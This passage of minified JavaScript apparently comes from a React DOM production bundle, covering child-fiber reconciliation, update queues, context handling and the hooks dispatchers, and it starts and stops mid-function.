          t);
    }
    if (typeof e != "string") throw Error(x(284));
    if (!n._owner) throw Error(x(290, e));
  }
  return e;
}
function kr(e, t) {
  throw (
    ((e = Object.prototype.toString.call(t)),
    Error(
      x(
        31,
        e === "[object Object]"
          ? "object with keys {" + Object.keys(t).join(", ") + "}"
          : e
      )
    ))
  );
}
function Zu(e) {
  var t = e._init;
  return t(e._payload);
}
function nc(e) {
  function t(f, c) {
    if (e) {
      var A = f.deletions;
      A === null ? ((f.deletions = [c]), (f.flags |= 16)) : A.push(c);
    }
  }
  function n(f, c) {
    if (!e) return null;
    for (; c !== null; ) t(f, c), (c = c.sibling);
    return null;
  }
  function r(f, c) {
    for (f = new Map(); c !== null; )
      c.key !== null ? f.set(c.key, c) : f.set(c.index, c), (c = c.sibling);
    return f;
  }
  function l(f, c) {
    return (f = At(f, c)), (f.index = 0), (f.sibling = null), f;
  }
  function i(f, c, A) {
    return (
      (f.index = A),
      e
        ? ((A = f.alternate),
          A !== null
            ? ((A = A.index), A < c ? ((f.flags |= 2), c) : A)
            : ((f.flags |= 2), c))
        : ((f.flags |= 1048576), c)
    );
  }
  function o(f) {
    return e && f.alternate === null && (f.flags |= 2), f;
  }
  function u(f, c, A, y) {
    return c === null || c.tag !== 6
      ? ((c = ai(A, f.mode, y)), (c.return = f), c)
      : ((c = l(c, A)), (c.return = f), c);
  }
  function s(f, c, A, y) {
    var k = A.type;
    return k === Bt
      ? p(f, c, A.props.children, y, A.key)
      : c !== null &&
        (c.elementType === k ||
          (typeof k == "object" &&
            k !== null &&
            k.$$typeof === et &&
            Zu(k) === c.type))
      ? ((y = l(c, A.props)), (y.ref = Sn(f, c, A)), (y.return = f), y)
      : ((y = Qr(A.type, A.key, A.props, null, f.mode, y)),
        (y.ref = Sn(f, c, A)),
        (y.return = f),
        y);
  }
  function a(f, c, A, y) {
    return c === null ||
      c.tag !== 4 ||
      c.stateNode.containerInfo !== A.containerInfo ||
      c.stateNode.implementation !== A.implementation
      ? ((c = ci(A, f.mode, y)), (c.return = f), c)
      : ((c = l(c, A.children || [])), (c.return = f), c);
  }
  function p(f, c, A, y, k) {
    return c === null || c.tag !== 7
      ? ((c = jt(A, f.mode, y, k)), (c.return = f), c)
      : ((c = l(c, A)), (c.return = f), c);
  }
  function d(f, c, A) {
    if ((typeof c == "string" && c !== "") || typeof c == "number")
      return (c = ai("" + c, f.mode, A)), (c.return = f), c;
    if (typeof c == "object" && c !== null) {
      switch (c.$$typeof) {
        case pr:
          return (
            (A = Qr(c.type, c.key, c.props, null, f.mode, A)),
            (A.ref = Sn(f, null, c)),
            (A.return = f),
            A
          );
        case Ft:
          return (c = ci(c, f.mode, A)), (c.return = f), c;
        case et:
          var y = c._init;
          return d(f, y(c._payload), A);
      }
      if (Nn(c) || mn(c))
        return (c = jt(c, f.mode, A, null)), (c.return = f), c;
      kr(f, c);
    }
    return null;
  }
  function h(f, c, A, y) {
    var k = c !== null ? c.key : null;
    if ((typeof A == "string" && A !== "") || typeof A == "number")
      return k !== null ? null : u(f, c, "" + A, y);
    if (typeof A == "object" && A !== null) {
      switch (A.$$typeof) {
        case pr:
          return A.key === k ? s(f, c, A, y) : null;
        case Ft:
          return A.key === k ? a(f, c, A, y) : null;
        case et:
          return (k = A._init), h(f, c, k(A._payload), y);
      }
      if (Nn(A) || mn(A)) return k !== null ? null : p(f, c, A, y, null);
      kr(f, A);
    }
    return null;
  }
  function g(f, c, A, y, k) {
    if ((typeof y == "string" && y !== "") || typeof y == "number")
      return (f = f.get(A) || null), u(c, f, "" + y, k);
    if (typeof y == "object" && y !== null) {
      switch (y.$$typeof) {
        case pr:
          return (f = f.get(y.key === null ? A : y.key) || null), s(c, f, y, k);
        case Ft:
          return (f = f.get(y.key === null ? A : y.key) || null), a(c, f, y, k);
        case et:
          var E = y._init;
          return g(f, c, A, E(y._payload), k);
      }
      if (Nn(y) || mn(y)) return (f = f.get(A) || null), p(c, f, y, k, null);
      kr(c, y);
    }
    return null;
  }
  function v(f, c, A, y) {
    for (
      var k = null, E = null, C = c, T = (c = 0), M = null;
      C !== null && T < A.length;
      T++
    ) {
      C.index > T ? ((M = C), (C = null)) : (M = C.sibling);
      var L = h(f, C, A[T], y);
      if (L === null) {
        C === null && (C = M);
        break;
      }
      e && C && L.alternate === null && t(f, C),
        (c = i(L, c, T)),
        E === null ? (k = L) : (E.sibling = L),
        (E = L),
        (C = M);
    }
    if (T === A.length) return n(f, C), Q && xt(f, T), k;
    if (C === null) {
      for (; T < A.length; T++)
        (C = d(f, A[T], y)),
          C !== null &&
            ((c = i(C, c, T)), E === null ? (k = C) : (E.sibling = C), (E = C));
      return Q && xt(f, T), k;
    }
    for (C = r(f, C); T < A.length; T++)
      (M = g(C, f, T, A[T], y)),
        M !== null &&
          (e && M.alternate !== null && C.delete(M.key === null ? T : M.key),
          (c = i(M, c, T)),
          E === null ? (k = M) : (E.sibling = M),
          (E = M));
    return (
      e &&
        C.forEach(function (Le) {
          return t(f, Le);
        }),
      Q && xt(f, T),
      k
    );
  }
  function w(f, c, A, y) {
    var k = mn(A);
    if (typeof k != "function") throw Error(x(150));
    if (((A = k.call(A)), A == null)) throw Error(x(151));
    for (
      var E = (k = null), C = c, T = (c = 0), M = null, L = A.next();
      C !== null && !L.done;
      T++, L = A.next()
    ) {
      C.index > T ? ((M = C), (C = null)) : (M = C.sibling);
      var Le = h(f, C, L.value, y);
      if (Le === null) {
        C === null && (C = M);
        break;
      }
      e && C && Le.alternate === null && t(f, C),
        (c = i(Le, c, T)),
        E === null ? (k = Le) : (E.sibling = Le),
        (E = Le),
        (C = M);
    }
    if (L.done) return n(f, C), Q && xt(f, T), k;
    if (C === null) {
      for (; !L.done; T++, L = A.next())
        (L = d(f, L.value, y)),
          L !== null &&
            ((c = i(L, c, T)), E === null ? (k = L) : (E.sibling = L), (E = L));
      return Q && xt(f, T), k;
    }
    for (C = r(f, C); !L.done; T++, L = A.next())
      (L = g(C, f, T, L.value, y)),
        L !== null &&
          (e && L.alternate !== null && C.delete(L.key === null ? T : L.key),
          (c = i(L, c, T)),
          E === null ? (k = L) : (E.sibling = L),
          (E = L));
    return (
      e &&
        C.forEach(function (An) {
          return t(f, An);
        }),
      Q && xt(f, T),
      k
    );
  }
  function S(f, c, A, y) {
    if (
      (typeof A == "object" &&
        A !== null &&
        A.type === Bt &&
        A.key === null &&
        (A = A.props.children),
      typeof A == "object" && A !== null)
    ) {
      switch (A.$$typeof) {
        case pr:
          e: {
            for (var k = A.key, E = c; E !== null; ) {
              if (E.key === k) {
                if (((k = A.type), k === Bt)) {
                  if (E.tag === 7) {
                    n(f, E.sibling),
                      (c = l(E, A.props.children)),
                      (c.return = f),
                      (f = c);
                    break e;
                  }
                } else if (
                  E.elementType === k ||
                  (typeof k == "object" &&
                    k !== null &&
                    k.$$typeof === et &&
                    Zu(k) === E.type)
                ) {
                  n(f, E.sibling),
                    (c = l(E, A.props)),
                    (c.ref = Sn(f, E, A)),
                    (c.return = f),
                    (f = c);
                  break e;
                }
                n(f, E);
                break;
              } else t(f, E);
              E = E.sibling;
            }
            A.type === Bt
              ? ((c = jt(A.props.children, f.mode, y, A.key)),
                (c.return = f),
                (f = c))
              : ((y = Qr(A.type, A.key, A.props, null, f.mode, y)),
                (y.ref = Sn(f, c, A)),
                (y.return = f),
                (f = y));
          }
          return o(f);
        case Ft:
          e: {
            for (E = A.key; c !== null; ) {
              if (c.key === E)
                if (
                  c.tag === 4 &&
                  c.stateNode.containerInfo === A.containerInfo &&
                  c.stateNode.implementation === A.implementation
                ) {
                  n(f, c.sibling),
                    (c = l(c, A.children || [])),
                    (c.return = f),
                    (f = c);
                  break e;
                } else {
                  n(f, c);
                  break;
                }
              else t(f, c);
              c = c.sibling;
            }
            (c = ci(A, f.mode, y)), (c.return = f), (f = c);
          }
          return o(f);
        case et:
          return (E = A._init), S(f, c, E(A._payload), y);
      }
      if (Nn(A)) return v(f, c, A, y);
      if (mn(A)) return w(f, c, A, y);
      kr(f, A);
    }
    return (typeof A == "string" && A !== "") || typeof A == "number"
      ? ((A = "" + A),
        c !== null && c.tag === 6
          ? (n(f, c.sibling), (c = l(c, A)), (c.return = f), (f = c))
          : (n(f, c), (c = ai(A, f.mode, y)), (c.return = f), (f = c)),
        o(f))
      : n(f, c);
  }
  return S;
}
var on = nc(!0),
  rc = nc(!1),
  nl = vt(null),
  rl = null,
  Jt = null,
  Oo = null;
function Mo() {
  Oo = Jt = rl = null;
}
function Fo(e) {
  var t = nl.current;
  V(nl), (e._currentValue = t);
}
function Ki(e, t, n) {
  for (; e !== null; ) {
    var r = e.alternate;
    if (
      ((e.childLanes & t) !== t
        ? ((e.childLanes |= t), r !== null && (r.childLanes |= t))
        : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
      e === n)
    )
      break;
    e = e.return;
  }
}
function $t(e, t) {
  (rl = e),
    (Oo = Jt = null),
    (e = e.dependencies),
    e !== null &&
      e.firstContext !== null &&
      (e.lanes & t && (pe = !0), (e.firstContext = null));
}
function je(e) {
  var t = e._currentValue;
  if (Oo !== e)
    if (((e = { context: e, memoizedValue: t, next: null }), Jt === null)) {
      if (rl === null) throw Error(x(308));
      (Jt = e), (rl.dependencies = { lanes: 0, firstContext: e });
    } else Jt = Jt.next = e;
  return t;
}
var Ct = null;
function Bo(e) {
  Ct === null ? (Ct = [e]) : Ct.push(e);
}
function lc(e, t, n, r) {
  var l = t.interleaved;
  return (
    l === null ? ((n.next = n), Bo(t)) : ((n.next = l.next), (l.next = n)),
    (t.interleaved = n),
    Ze(e, r)
  );
}
function Ze(e, t) {
  e.lanes |= t;
  var n = e.alternate;
  for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null; )
    (e.childLanes |= t),
      (n = e.alternate),
      n !== null && (n.childLanes |= t),
      (n = e),
      (e = e.return);
  return n.tag === 3 ? n.stateNode : null;
}
var tt = !1;
function Vo(e) {
  e.updateQueue = {
    baseState: e.memoizedState,
    firstBaseUpdate: null,
    lastBaseUpdate: null,
    shared: { pending: null, interleaved: null, lanes: 0 },
    effects: null,
  };
}
function ic(e, t) {
  (e = e.updateQueue),
    t.updateQueue === e &&
      (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects,
      });
}
function Ge(e, t) {
  return {
    eventTime: e,
    lane: t,
    tag: 0,
    payload: null,
    callback: null,
    next: null,
  };
}
function ft(e, t, n) {
  var r = e.updateQueue;
  if (r === null) return null;
  if (((r = r.shared), R & 2)) {
    var l = r.pending;
    return (
      l === null ? (t.next = t) : ((t.next = l.next), (l.next = t)),
      (r.pending = t),
      Ze(e, n)
    );
  }
  return (
    (l = r.interleaved),
    l === null ? ((t.next = t), Bo(r)) : ((t.next = l.next), (l.next = t)),
    (r.interleaved = t),
    Ze(e, n)
  );
}
function Rr(e, t, n) {
  if (
    ((t = t.updateQueue), t !== null && ((t = t.shared), (n & 4194240) !== 0))
  ) {
    var r = t.lanes;
    (r &= e.pendingLanes), (n |= r), (t.lanes = n), ko(e, n);
  }
}
function bu(e, t) {
  var n = e.updateQueue,
    r = e.alternate;
  if (r !== null && ((r = r.updateQueue), n === r)) {
    var l = null,
      i = null;
    if (((n = n.firstBaseUpdate), n !== null)) {
      do {
        var o = {
          eventTime: n.eventTime,
          lane: n.lane,
          tag: n.tag,
          payload: n.payload,
          callback: n.callback,
          next: null,
        };
        i === null ? (l = i = o) : (i = i.next = o), (n = n.next);
      } while (n !== null);
      i === null ? (l = i = t) : (i = i.next = t);
    } else l = i = t;
    (n = {
      baseState: r.baseState,
      firstBaseUpdate: l,
      lastBaseUpdate: i,
      shared: r.shared,
      effects: r.effects,
    }),
      (e.updateQueue = n);
    return;
  }
  (e = n.lastBaseUpdate),
    e === null ? (n.firstBaseUpdate = t) : (e.next = t),
    (n.lastBaseUpdate = t);
}
function ll(e, t, n, r) {
  var l = e.updateQueue;
  tt = !1;
  var i = l.firstBaseUpdate,
    o = l.lastBaseUpdate,
    u = l.shared.pending;
  if (u !== null) {
    l.shared.pending = null;
    var s = u,
      a = s.next;
    (s.next = null), o === null ? (i = a) : (o.next = a), (o = s);
    var p = e.alternate;
    p !== null &&
      ((p = p.updateQueue),
      (u = p.lastBaseUpdate),
      u !== o &&
        (u === null ? (p.firstBaseUpdate = a) : (u.next = a),
        (p.lastBaseUpdate = s)));
  }
  if (i !== null) {
    var d = l.baseState;
    (o = 0), (p = a = s = null), (u = i);
    do {
      var h = u.lane,
        g = u.eventTime;
      if ((r & h) === h) {
        p !== null &&
          (p = p.next =
            {
              eventTime: g,
              lane: 0,
              tag: u.tag,
              payload: u.payload,
              callback: u.callback,
              next: null,
            });
        e: {
          var v = e,
            w = u;
          switch (((h = t), (g = n), w.tag)) {
            case 1:
              if (((v = w.payload), typeof v == "function")) {
                d = v.call(g, d, h);
                break e;
              }
              d = v;
              break e;
            case 3:
              v.flags = (v.flags & -65537) | 128;
            case 0:
              if (
                ((v = w.payload),
                (h = typeof v == "function" ? v.call(g, d, h) : v),
                h == null)
              )
                break e;
              d = W({}, d, h);
              break e;
            case 2:
              tt = !0;
          }
        }
        u.callback !== null &&
          u.lane !== 0 &&
          ((e.flags |= 64),
          (h = l.effects),
          h === null ? (l.effects = [u]) : h.push(u));
      } else
        (g = {
          eventTime: g,
          lane: h,
          tag: u.tag,
          payload: u.payload,
          callback: u.callback,
          next: null,
        }),
          p === null ? ((a = p = g), (s = d)) : (p = p.next = g),
          (o |= h);
      if (((u = u.next), u === null)) {
        if (((u = l.shared.pending), u === null)) break;
        (h = u),
          (u = h.next),
          (h.next = null),
          (l.lastBaseUpdate = h),
          (l.shared.pending = null);
      }
    } while (!0);
    if (
      (p === null && (s = d),
      (l.baseState = s),
      (l.firstBaseUpdate = a),
      (l.lastBaseUpdate = p),
      (t = l.shared.interleaved),
      t !== null)
    ) {
      l = t;
      do (o |= l.lane), (l = l.next);
      while (l !== t);
    } else i === null && (l.shared.lanes = 0);
    (It |= o), (e.lanes = o), (e.memoizedState = d);
  }
}
function _u(e, t, n) {
  if (((e = t.effects), (t.effects = null), e !== null))
    for (t = 0; t < e.length; t++) {
      var r = e[t],
        l = r.callback;
      if (l !== null) {
        if (((r.callback = null), (r = n), typeof l != "function"))
          throw Error(x(191, l));
        l.call(r);
      }
    }
}
var sr = {},
  Ke = vt(sr),
  bn = vt(sr),
  _n = vt(sr);
function Pt(e) {
  if (e === sr) throw Error(x(174));
  return e;
}
function Qo(e, t) {
  switch ((F(_n, t), F(bn, e), F(Ke, sr), (e = t.nodeType), e)) {
    case 9:
    case 11:
      t = (t = t.documentElement) ? t.namespaceURI : xi(null, "");
      break;
    default:
      (e = e === 8 ? t.parentNode : t),
        (t = e.namespaceURI || null),
        (e = e.tagName),
        (t = xi(t, e));
  }
  V(Ke), F(Ke, t);
}
function un() {
  V(Ke), V(bn), V(_n);
}
function oc(e) {
  Pt(_n.current);
  var t = Pt(Ke.current),
    n = xi(t, e.type);
  t !== n && (F(bn, e), F(Ke, n));
}
function Do(e) {
  bn.current === e && (V(Ke), V(bn));
}
var D = vt(0);
function il(e) {
  for (var t = e; t !== null; ) {
    if (t.tag === 13) {
      var n = t.memoizedState;
      if (
        n !== null &&
        ((n = n.dehydrated), n === null || n.data === "$?" || n.data === "$!")
      )
        return t;
    } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
      if (t.flags & 128) return t;
    } else if (t.child !== null) {
      (t.child.return = t), (t = t.child);
      continue;
    }
    if (t === e) break;
    for (; t.sibling === null; ) {
      if (t.return === null || t.return === e) return null;
      t = t.return;
    }
    (t.sibling.return = t.return), (t = t.sibling);
  }
  return null;
}
var ri = [];
function Ko() {
  for (var e = 0; e < ri.length; e++)
    ri[e]._workInProgressVersionPrimary = null;
  ri.length = 0;
}
var Or = _e.ReactCurrentDispatcher,
  li = _e.ReactCurrentBatchConfig,
  Ut = 0,
  K = null,
  q = null,
  b = null,
  ol = !1,
  On = !1,
  $n = 0,
  Ip = 0;
function re() {
  throw Error(x(321));
}
function Wo(e, t) {
  if (t === null) return !1;
  for (var n = 0; n < t.length && n < e.length; n++)
    if (!Fe(e[n], t[n])) return !1;
  return !0;
}
function Xo(e, t, n, r, l, i) {
  if (
    ((Ut = i),
    (K = t),
    (t.memoizedState = null),
    (t.updateQueue = null),
    (t.lanes = 0),
    (Or.current = e === null || e.memoizedState === null ? Mp : Fp),
    (e = n(r, l)),
    On)
  ) {
    i = 0;
    do {
      if (((On = !1), ($n = 0), 25 <= i)) throw Error(x(301));
      (i += 1),
        (b = q = null),
        (t.updateQueue = null),
        (Or.current = Bp),
        (e = n(r, l));
    } while (On);
  }
  if (
    ((Or.current = ul),
    (t = q !== null && q.next !== null),
    (Ut = 0),
    (b = q = K = null),
    (ol = !1),
    t)
  )
    throw Error(x(300));
  return e;
}
function Ho() {
  var e = $n !== 0;
  return ($n = 0), e;
}
function Ve() {
  var e = {
    memoizedState: null,
    baseState: null,
    baseQueue: null,
    queue: null,
    next: null,
  };
  return b === null ? (K.memoizedState = b = e) : (b = b.next = e), b;
}
function Te() {
  if (q === null) {
    var e = K.alternate;
    e = e !== null ? e.memoizedState : null;
  } else e = q.next;
  var t = b === null ? K.memoizedState : b.next;
  if (t !== null) (b = t), (q = e);
  else {
    if (e === null) throw Error(x(310));
    (q = e),
      (e = {
        memoizedState: q.memoizedState,
        baseState: q.baseState,
        baseQueue: q.baseQueue,
        queue: q.queue,
        next: null,
      }),
      b === null ? (K.memoizedState = b = e) : (b = b.next = e);
  }
  return b;
}
function er(e, t) {
  return typeof t == "function" ? t(e) : t;
}
function ii(e) {
  var t = Te(),
    n = t.queue;
  if (n === null) throw Error(x(311));
  n.lastRenderedReducer = e;
  var r = q,
    l = r.baseQueue,
    i = n.pending;
  if (i !== null) {
    if (l !== null) {
      var o = l.next;
      (l.next = i.next), (i.next = o);
    }
    (r.baseQueue = l = i), (n.pending = null);
  }
  if (l !== null) {
    (i = l.next), (r = r.baseState);
    var u = (o = null),
      s = null,
      a = i;
    do {
      var p = a.lane;
      if ((Ut & p) === p)
        s !== null &&
          (s = s.next =
            {
              lane: 0,
              action: a.action,
              hasEagerState: a.hasEagerState,
              eagerState: a.eagerState,
              next: null,
            }),
          (r = a.hasEagerState ? a.eagerState : e(r, a.action));
      else {
        var d = {
          lane: p,
          action: a.action,
          hasEagerState: a.hasEagerState,
          eagerState: a.eagerState,
          next: null,
        };
        s === null ? ((u = s = d), (o = r)) : (s = s.next = d),
          (K.lanes |= p),
          (It |= p);
      }
      a = a.next;
    } while (a !== null && a !== i);
    s === null ? (o = r) : (s.next = u),
      Fe(r, t.memoizedState) || (pe = !0),
      (t.memoizedState = r),
      (t.baseState = o),
      (t.baseQueue = s),
      (n.lastRenderedState = r);
  }
  if (((e = n.interleaved), e !== null)) {
    l = e;
    do (i = l.lane), (K.lanes |= i), (It |= i), (l = l.next);
    while (l !== e);
  } else l === null && (n.lanes = 0);
  return [t.memoizedState, n.dispatch];
}
function oi(e) {
  var t = Te(),
    n = t.queue;
  if (n === null) throw Error(x(311));
  n.lastRenderedReducer = e;
  var r = n.dispatch,
    l = n.pending,
    i = t.memoizedState;
  if (l !== null) {
    n.pending = null;
    var o = (l = l.next);
    do (i = e(i, o.action)), (o = o.next);
    while (o !== l);
    Fe(i, t.memoizedState) || (pe = !0),
      (t.memoizedState = i),
      t.baseQueue === null && (t.baseState = i),
      (n.lastRenderedState = i);
  }
  return [i, r];
}
function uc() {}
function sc(e, t) {
  var n = K,
    r = Te(),
    l = t(),
    i = !Fe(r.memoizedState, l);
  if (
    (i && ((r.memoizedState = l), (pe = !0)),
    (r = r.queue),
    Jo(fc.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || i || (b !== null && b.memoizedState.tag & 1))
  ) {
    if (
      ((n.flags |= 2048),
      tr(9, cc.bind(null, n, r, l, t), void 0, null),
      _ === null)
    )
      throw Error(x(349));
    Ut & 30 || ac(n, t, l);
  }
  return l;
}
function ac(e, t, n) {
  (e.flags |= 16384),
    (e = { getSnapshot: t, value: n }),
    (t = K.updateQueue),
    t === null
      ? ((t = { lastEffect: null, stores: null }),
        (K.updateQueue = t),
        (t.stores = [e]))
      : ((n = t.stores), n === null ? (t.stores = [e]) : n.push(e));
}
function cc(e, t, n, r) {
  (t.value = n), (t.getSnapshot = r), dc(t) && pc(e);
}
function fc(e, t, n) {
  return n(function () {
    dc(t) && pc(e);
  });
}
function dc(e) {
  var t = e.getSnapshot;
  e = e.value;
  try {
    var n = t();
    return !Fe(e, n);
  } catch {
    return !0;
  }
}
function pc(e) {
  var t = Ze(e, 1);
  t !== null && Me(t, e, 1, -1);
}
function $u(e) {
  var t = Ve();
  return (
    typeof e == "function" && (e = e()),
    (t.memoizedState = t.baseState = e),
    (e = {
      pending: null,
      interleaved: null,
      lanes: 0,
      dispatch: null,
      lastRenderedReducer: er,
      lastRenderedState: e,
    }),
    (t.queue = e),
    (e = e.dispatch = Op.bind(null, K, e)),
    [t.memoizedState, e]
  );
}
function tr(e, t, n, r) {
  return (
    (e = { tag: e, create: t, destroy: n, deps: r, next: null }),
    (t = K.updateQueue),
    t === null
      ? ((t = { lastEffect: null, stores: null }),
        (K.updateQueue = t),
        (t.lastEffect = e.next = e))
      : ((n = t.lastEffect),
        n === null
          ? (t.lastEffect = e.next = e)
          : ((r = n.next), (n.next = e), (e.next = r), (t.lastEffect = e))),
    e
  );
}
function Ac() {
  return Te().memoizedState;
}
function Mr(e, t, n, r) {
  var l = Ve();
  (K.flags |= e),
    (l.memoizedState = tr(1 | t, n, void 0, r === void 0 ? null : r));
}
function El(e, t, n, r) {
  var l = Te();
  r = r === void 0 ? null : r;
  var i = void 0;
  if (q !== null) {
    var o = q.memoizedState;
    if (((i = o.destroy), r !== null && Wo(r, o.deps))) {
      l.memoizedState = tr(t, n, i, r);
      return;
    }
  }
  (K.flags |= e), (l.memoizedState = tr(1 | t, n, i, r));
}
function es(e, t) {
  return Mr(8390656, 8, e, t);
}
function Jo(e, t) {
  return El(2048, 8, e, t);
}
function hc(e, t) {
  return El(4, 2, e, t);
}
function mc(e, t) {
  return El(4, 4, e, t);
}
function gc(e, t) {
  if (typeof t == "function")
    return (
      (e = e()),
      t(e),
      function () {
        t(null);
      }
    );
  if (t != null)
    return (
      (e = e()),
      (t.current = e),
      function () {
        t.current = null;
      }
    );
}
function vc(e, t, n) {
  return (
    (n = n != null ? n.concat([e]) : null), El(4, 4, gc.bind(null, t, e), n)
  );
}
function Go() {}
function yc(e, t) {
  var n = Te();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && Wo(t, r[1])
    ? r[0]
    : ((n.memoizedState = [e, t]), e);
}
function wc(e, t) {
  var n = Te();
  t = t === void 0 ? null : t;
  var r = n.memoizedState;
  return r !== null && t !== null && Wo(t, r[1])
    ? r[0]
    : ((e = e()), (n.memoizedState = [e, t]), e);
}
function Sc(e, t, n) {
  return Ut & 21
    ? (Fe(n, t) || ((n = Pa()), (K.lanes |= n), (It |= n), (e.baseState = !0)),
      t)
    : (e.baseState && ((e.baseState = !1), (pe = !0)), (e.memoizedState = n));
}
function zp(e, t) {
  var n = O;
  (O = n !== 0 && 4 > n ? n : 4), e(!0);
  var r = li.transition;
  li.transition = {};
  try {
    e(!1), t();
  } finally {
    (O = n), (li.transition = r);
  }
}
function xc() {
  return Te().memoizedState;
}
function Rp(e, t, n) {
  var r = pt(e);
  if (
    ((n = {
      lane: r,
      action: n,
      hasEagerState: !1,
      eagerState: null,
      next: null,
    }),
    Ec(e))
  )
    kc(t, n);
  else if (((n = lc(e, t, n, r)), n !== null)) {
    var l = se();
    Me(n, e, r, l), Cc(n, t, r);
  }
}
function Op(e, t, n) {
  var r = pt(e),
    l = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null };
  if (Ec(e)) kc(t, l);
  else {
    var i = e.alternate;
    if (
      e.lanes === 0 &&
      (i === null || i.lanes === 0) &&
      ((i = t.lastRenderedReducer), i !== null)
    )
      try {
        var o = t.lastRenderedState,
          u = i(o, n);
        if (((l.hasEagerState = !0), (l.eagerState = u), Fe(u, o))) {
          var s = t.interleaved;
          s === null
            ? ((l.next = l), Bo(t))
            : ((l.next = s.next), (s.next = l)),
            (t.interleaved = l);
          return;
        }
      } catch {
      } finally {
      }
    (n = lc(e, t, l, r)),
      n !== null && ((l = se()), Me(n, e, r, l), Cc(n, t, r));
  }
}
function Ec(e) {
  var t = e.alternate;
  return e === K || (t !== null && t === K);
}
function kc(e, t) {
  On = ol = !0;
  var n = e.pending;
  n === null ? (t.next = t) : ((t.next = n.next), (n.next = t)),
    (e.pending = t);
}
function Cc(e, t, n) {
  if (n & 4194240) {
    var r = t.lanes;
    (r &= e.pendingLanes), (n |= r), (t.lanes = n), ko(e, n);
  }
}
var ul = {
    readContext: je,
    useCallback: re,
    useContext: re,
    useEffect: re,
    useImperativeHandle: re,
    useInsertionEffect: re,
    useLayoutEffect: re,
    useMemo: re,
    useReducer: re,
    useRef: re,
    useState: re,
    useDebugValue: re,
    useDeferredValue: re,
    useTransition: re,
    useMutableSource: re,
    useSyncExternalStore: re,
    useId: re,
    unstable_isNewReconciler: !1,
  },
  Mp = {
    readContext: je,
    useCallback: function (e, t) {
      return (Ve().memoizedState = [e, t === void 0 ? null : t]), e;
    },
    useContext: je,
    useEffect: es,
    useImperativeHandle: function (e, t, n) {
      return (
        (n = n != null ? n.concat([e]) : null),
        Mr(4194308, 4, gc.bind(null, t, e), n)
      );
    },
    useLayoutEffect: function (e, t) {
      return Mr(4194308, 4, e, t);
    },
    useInsertionEffect: function (e, t) {
      return Mr(4, 2, e, t);
    },
    useMemo: function (e, t) {
      var n = Ve();
      return (
        (t = t === void 0 ? null : t), (e = e()), (n.memoizedState = [e, t]), e
      );
    },
    useReducer: function (e, t, n) {
      var r = Ve();
      return (
        (t = n !== void 0 ? n(t) : t),
        (r.memoizedState = r.baseState = t),
        (e = {
          pending: null,
          interleaved: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: e,
          lastRenderedState: t,
        }),
        (r.queue = e),
        (e = e.dispatch = Rp.bind(null, K, e)),
        [r.memoizedState, e]
      );
    },
    useRef: function (e) {
      var t = Ve();
      return (e = { current: e }), (t.memoizedState = e);
    },
    useState: $u,
    useDebugValue: Go,
    useDeferredValue: function (e) {
      return (Ve().memoizedState = e);
    },
    useTransition: function () {
      var e = $u(!1),
        t = e[0];
      return (e = zp.bind(null, e[1])), (Ve().memoizedState = e), [t, e];
    },
    useMutableSource: function () {},
    useSyncExternalStore: function (e, t, n) {
      var r = K,
        l = Ve();
      if (Q) {
        if (n === void 0) throw Error(x(407));
        n = n();
      } else {
        if (((n = t()), _ === null)) throw Error(x(349));
        Ut & 30 || ac(r, t, n);
      }
      l.memoizedState = n;
      var i = { value: n, getSnapshot: t };
      return (
        (l.queue = i),
        es(fc.bind(null, r, i, e), [e]),
        (r.flags |= 2048),
        tr(9, cc.bind(null, r, i, n, t), void 0, null),
        n
      );
    },
    useId: function () {
      var e = Ve(),
        t = _.identifierPrefix;
      if (Q) {
        var n = Je,
          r = He;
        (n = (r & ~(1 << (32 - Oe(r) - 1))).toString(32) + n),
          (t = ":" + t + "R" + n),
          (n = $n++),
          0 < n && (t += "H" + n.toString(32)),
          (t += ":");
      } else (n = Ip++), (t = ":" + t + "r" + n.toString(32) + ":");
      return (e.memoizedState = t);
    },
    unstable_isNewReconciler: !1,
  },
  Fp = {
    readContext: je,
    useCallback: yc,
    useContext: je,
    useEffect: Jo,
    useImperativeHandle: vc,
    useInsertionEffect: hc,
    useLayoutEffect: mc,
    useMemo: wc,
    useReducer: ii,
    useRef: Ac,
    useState: function () {
      return ii(er);
    },
    useDebugValue: Go,
    useDeferredValue: function (e) {
      var t = Te();
      return Sc(t, q.memoizedState, e);
    },
    useTransition: function () {
      var e = ii(er)[0],
        t = Te().memoizedState;
      return [e, t];
    },
    useMutableSource: uc,
    useSyncExternalStore: sc,
    useId: xc,
    unstable_isNewReconciler: !1,
  },
  Bp = {
    readContext: je,
    useCallback: yc,
    useContext: je,
    useEffect: Jo,
    useImperativeHandle: vc,
    useInsertionEffect: hc,
    useLayoutEffect: mc,
    useMemo: wc,
    useReducer: oi,
    useRef: Ac,
    useState: function () {
      return oi(er);
    },
    useDebugValue: Go,
    useDeferredValue: function (e) {
      var t = Te();
      return q === null ? (t.memoizedState = e) : Sc(t, q.memoizedState, e);
    },
    useTransition: function () {
      var e = oi(er)[0],
        t = Te().memoizedState;
      return [e, t];
    },
    useMutableSource: uc,
    useSyncExternalStore: sc,
    useId: xc,
    unstable_isNewReconciler: !1,
  };
function Ie(e, t) {
  if (e && e.defaultProps) {
    (t = W({}, t)), (e = e.defaultProps);
    for (var n in e) t[n] === void 0 && (t[n] = e[n]);
    return t;
  }
  return t;
}
function Wi(e, t, n, r) {
  (t = e.memoizedState),
    (n = n(r, t)),
    (n = n == null ? t : W({}, t, n)),
    (e.memoizedState = n),
    e.lanes === 0 && (e.updateQueue.baseState = n);
}
var kl = {
  isMounted: function (e) {
    return (e = e._reactInternals) ? Ot(e) === e : !1;
  },
  enqueueSetState: function (e, t, n) {
    e = e._reactInternals;
    var r = se(),
      l = pt(e),
      i = Ge(r, l);
    (i.payload = t),
      n != null && (i.callback = n),
      (t = ft(e, i, l)),
      t !== null && (Me(t, e, l, r), Rr(t, e, l));
  },
  enqueueReplaceState: function (e, t, n) {
    e = e._reactInternals;
    var r = se(),
      l = pt(e),
      i = Ge(r, l);
    (i.tag = 1),
      (i.payload = t),
